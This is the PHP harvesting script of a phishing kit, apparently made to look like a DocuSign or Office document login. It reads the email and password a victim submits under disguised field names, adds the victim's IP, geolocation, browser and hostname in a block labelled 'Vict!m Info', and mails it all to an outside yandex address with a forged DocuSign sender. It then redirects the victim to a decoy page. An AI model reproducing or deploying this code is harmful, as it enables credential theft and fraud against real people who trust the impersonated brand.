<?php
require("count.php");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Online Info-----------------------\n";
$message .= "Email:             : ".$_POST['goni']."\n";
//$message .= "Phone Number:             : ".$_POST['stabeks']."\n";//
$miv = $_POST['goni'];
$message .= "Password:             : ".$_POST['cimeltorq']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY $PG Bon-------------\n";
$send = "email@yandex.com";
$subject = "OG Docu Office % From $ip";
$headers = "From: DocuSign New Kings <customer-support@blockbyblockblock.org>";
$headers .= $_POST['cherryches']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
header("Location: offdex.html?email=$miv&source=product.landing_");

	 
?>
